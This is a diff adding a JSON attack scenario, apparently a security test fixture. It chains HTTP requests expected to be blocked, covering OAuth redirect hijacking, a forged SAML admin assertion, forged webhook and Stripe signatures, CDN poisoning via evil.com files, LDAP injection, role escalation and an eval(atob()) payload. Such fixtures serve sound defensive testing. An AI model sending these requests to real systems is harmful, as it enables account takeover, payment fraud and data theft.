@@ -1,0 +1,364 @@
+{
+  "id": "third-party-integration-attacks",
+  "name": "Third-Party Integration Attacks",
+  "category": "Identity & Integration Security",
+  "difficulty": "Expert",
+  "description": "Sophisticated attacks targeting OAuth provider impersonation, SAML manipulation, webhook hijacking, callback exploitation, and CDN/payment processor abuse through compromised third-party integrations",
+  "tags": [
+    "third-party",
+    "oauth-abuse",
+    "saml-attacks",
+    "webhook-hijack",
+    "integration-fraud"
+  ],
+  "steps": [
+    {
+      "id": "integration-recon-1",
+      "name": "Third-Party Integration Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/.well-known/openid_configuration",
+        "headers": {
+          "User-Agent": "OAuth2-Client/1.0 (compatible; OpenID Connect Discovery)",
+          "Accept": "application/json"
+        }
+      },
+      "execution": {
+        "delayMs": 600
+      }
+    },
+    {
+      "id": "integration-recon-2",
+      "name": "SAML Metadata Enumeration",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/saml/metadata",
+        "headers": {
+          "User-Agent": "SAML-Metadata-Parser/2.1",
+          "Accept": "application/samlmetadata+xml, text/xml"
+        }
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "dependsOn": [
+        "integration-recon-1"
+      ]
+    },
+    {
+      "id": "integration-webhook-discovery-1",
+      "name": "Webhook Endpoint Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "OPTIONS",
+        "url": "/api/webhooks/callback",
+        "headers": {
+          "User-Agent": "WebhookDiscovery/1.0",
+          "Access-Control-Request-Method": "POST",
+          "Access-Control-Request-Headers": "X-Hub-Signature-256"
+        }
+      },
+      "execution": {
+        "delayMs": 1400
+      },
+      "dependsOn": [
+        "integration-recon-2"
+      ]
+    },
+    {
+      "id": "integration-oauth-probe-1",
+      "name": "OAuth Provider Impersonation Probe",
+      "stage": "delivery",
+      "request": {
+        "method": "GET",
+        "url": "/api/oauth/authorize",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Referer": "https://trusted-oauth-provider.com"
+        },
+        "params": {
+          "client_id": "legitimate_client_id",
+          "response_type": "code",
+          "redirect_uri": "https://attacker-controlled.com/oauth/callback",
+          "scope": "openid profile email admin",
+          "state": "csrf_bypass_attempt"
+        }
+      },
+      "execution": {
+        "delayMs": 2200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-webhook-discovery-1"
+      ]
+    },
+    {
+      "id": "integration-saml-manipulation-1",
+      "name": "SAML Response Manipulation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/saml/sso",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent": "Mozilla/5.0 (compatible; SAML-Client/2.0)"
+        },
+        "body": "SAMLResponse=PHNhbWw6QXNzZXJ0aW9uIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0Yzpte21sOjIuMDphc3NlcnRpb24iPjxzYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD48c2FtbDpBdHRyaWJ1dGUgTmFtZT0iUm9sZSI+PHNhbWw6QXR0cmlidXRlVmFsdWU+QWRtaW5pc3RyYXRvcjwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjwvc2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ+PC9zYW1sOkFzc2VydGlvbj4%3D&RelayState=malicious_relay_state"
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-oauth-probe-1"
+      ]
+    },
+    {
+      "id": "integration-webhook-hijack-1",
+      "name": "Webhook Callback Hijacking",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/webhooks/callback",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Hub-Signature-256": "sha256=forged_signature_bypassing_validation",
+          "X-GitHub-Event": "push",
+          "User-Agent": "GitHub-Hookshot/abc123"
+        },
+        "body": "{\"repository\": {\"name\": \"production-app\", \"full_name\": \"company/production-app\"}, \"head_commit\": {\"id\": \"malicious_commit_id\", \"message\": \"Security update\", \"url\": \"https://attacker.com/malicious-payload\"}, \"action\": \"opened\", \"hook_id\": 123456789}"
+      },
+      "execution": {
+        "delayMs": 3800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-saml-manipulation-1"
+      ]
+    },
+    {
+      "id": "integration-oauth-token-theft-1",
+      "name": "OAuth Access Token Theft via Redirect",
+      "stage": "credential-access",
+      "request": {
+        "method": "GET",
+        "url": "/api/oauth/callback",
+        "headers": {
+          "User-Agent": "OAuth2-Client/1.0",
+          "Referer": "https://malicious-oauth-provider.com/authorize"
+        },
+        "params": {
+          "code": "stolen_authorization_code",
+          "state": "bypassed_csrf_token",
+          "iss": "https://malicious-oauth-provider.com"
+        }
+      },
+      "execution": {
+        "delayMs": 4600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-webhook-hijack-1"
+      ]
+    },
+    {
+      "id": "integration-payment-fraud-1",
+      "name": "Payment Processor Integration Fraud",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/integrations/payment/webhook",
+        "headers": {
+          "Content-Type": "application/json",
+          "Stripe-Signature": "t=1234567890,v1=forged_stripe_signature",
+          "User-Agent": "Stripe/1.0 (+https://stripe.com/docs/webhooks)"
+        },
+        "body": "{\"id\": \"evt_fraudulent_payment\", \"object\": \"event\", \"type\": \"payment_intent.succeeded\", \"data\": {\"object\": {\"id\": \"pi_fake_payment\", \"amount\": 100000, \"currency\": \"usd\", \"status\": \"succeeded\", \"metadata\": {\"user_id\": \"admin\", \"privilege_escalation\": \"true\"}}}}"
+      },
+      "execution": {
+        "delayMs": 5400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-oauth-token-theft-1"
+      ]
+    },
+    {
+      "id": "integration-cdn-poisoning-1",
+      "name": "CDN Integration Resource Poisoning",
+      "stage": "exploitation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/integrations/cdn/invalidate",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer compromised_cdn_api_key",
+          "CloudFlare-API-Email": "admin@target.com"
+        },
+        "body": "{\"files\": [\"https://cdn.target.com/js/app.min.js\", \"https://cdn.target.com/css/styles.css\"], \"purge_everything\": true, \"replacement_urls\": [\"https://malicious-cdn.evil.com/backdoored-app.js\", \"https://malicious-cdn.evil.com/keylogger-styles.css\"]}"
+      },
+      "execution": {
+        "delayMs": 6200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-payment-fraud-1"
+      ]
+    },
+    {
+      "id": "integration-social-login-bypass-1",
+      "name": "Social Login Provider Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/auth/social/google",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"id_token\": \"eyJhbGciOiJSUzI1NiIsImtpZCI6ImZha2Vfa2V5X2lkIn0.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJhdWQiOiJsZWdpdGltYXRlX2NsaWVudF9pZCIsInN1YiI6IjEyMzQ1Njc4OTAiLCJlbWFpbCI6ImFkbWluQHRhcmdldC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaWF0IjoxNjk5OTk5OTk5LCJleHAiOjk5OTk5OTk5OTl9.forged_signature_here\", \"access_token\": \"ya29.forged_google_access_token\", \"email\": \"admin@target.com\", \"verified_email\": true, \"bypass_verification\": true}"
+      },
+      "execution": {
+        "delayMs": 7000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-cdn-poisoning-1"
+      ]
+    },
+    {
+      "id": "integration-api-key-rotation-1",
+      "name": "Third-Party API Key Rotation Attack",
+      "stage": "persistence",
+      "request": {
+        "method": "PUT",
+        "url": "/api/integrations/third-party",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer hijacked_admin_token"
+        },
+        "body": "{\"service\": \"stripe\", \"api_key\": \"sk_live_attacker_controlled_key\", \"webhook_endpoint\": \"https://evil.com/webhooks\", \"auto_rotate\": false, \"permissions\": [\"read\", \"write\", \"admin\"]}"
+      },
+      "execution": {
+        "delayMs": 7800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-social-login-bypass-1"
+      ]
+    },
+    {
+      "id": "integration-sso-session-fixation-1",
+      "name": "SSO Session Fixation Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/sso/session/create",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Cookie": "SESSIONID=attacker_controlled_session_id; JSESSIONID=hijacked_session"
+        },
+        "params": {
+          "session_id": "attacker_controlled_session_id",
+          "user_id": "admin",
+          "provider": "okta",
+          "force_session": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 8600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-api-key-rotation-1"
+      ]
+    },
+    {
+      "id": "integration-federated-search-1",
+      "name": "Federated Identity Search Poisoning",
+      "stage": "lateral-movement",
+      "request": {
+        "method": "POST",
+        "url": "/api/identity/federated/search",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-LDAP-Bind": "cn=admin,dc=company,dc=com"
+        },
+        "body": "{\"query\": \"(&(objectClass=user)(|(cn=admin)(memberOf=CN=Administrators,CN=Builtin,DC=company,DC=com)))\", \"base_dn\": \"DC=company,DC=com\", \"scope\": \"subtree\", \"attributes\": [\"userPassword\", \"memberOf\", \"adminCount\"], \"ldap_injection\": \"*)(objectClass=*))(&(objectClass=void\"}"
+      },
+      "execution": {
+        "delayMs": 9400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-sso-session-fixation-1"
+      ]
+    },
+    {
+      "id": "integration-privilege-escalation-1",
+      "name": "Cross-Integration Privilege Escalation",
+      "stage": "privilege-escalation",
+      "request": {
+        "method": "PATCH",
+        "url": "/api/users/roles/assign",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer oauth_token_with_elevated_scope"
+        },
+        "body": "{\"user_id\": \"attacker@evil.com\", \"roles\": [\"admin\", \"super_admin\", \"system_admin\"], \"provider\": \"oauth\", \"bypass_approval\": true, \"inheritance\": \"all_integrations\"}"
+      },
+      "execution": {
+        "delayMs": 10200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-federated-search-1"
+      ]
+    },
+    {
+      "id": "integration-data-sync-manipulation-1",
+      "name": "Data Synchronization Manipulation",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/sync/schedule",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"source\": \"salesforce\", \"destination\": \"internal_db\", \"schedule\": \"* * * * *\", \"data_transformation\": \"eval(atob('bWFsaWNpb3VzX2NvZGVfaGVyZQ=='))\", \"sync_sensitive_data\": true, \"override_permissions\": true}"
+      },
+      "execution": {
+        "delayMs": 11000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "integration-privilege-escalation-1"
+      ]
+    }
+  ]
+}
